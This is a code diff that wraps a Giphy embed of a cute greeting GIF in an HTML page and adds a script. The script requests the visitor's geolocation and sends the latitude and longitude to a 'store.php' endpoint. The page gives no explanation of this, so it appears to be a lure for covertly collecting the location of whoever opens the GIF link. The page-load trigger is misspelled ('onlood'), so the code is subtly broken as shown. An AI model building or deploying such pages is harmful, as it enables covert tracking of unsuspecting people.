@@ -1,1 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body onlood="getLocation()">
+
 <iframe src="https://giphy.com/embed/euGdZFn3rPoD5r5Y5n" width="328" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/greetingsisland-cute-fun-euGdZFn3rPoD5r5Y5n">via GIPHY</a></p>
+<h1>HTML Geolocation</h1>
+
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+    xhttp.send();
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
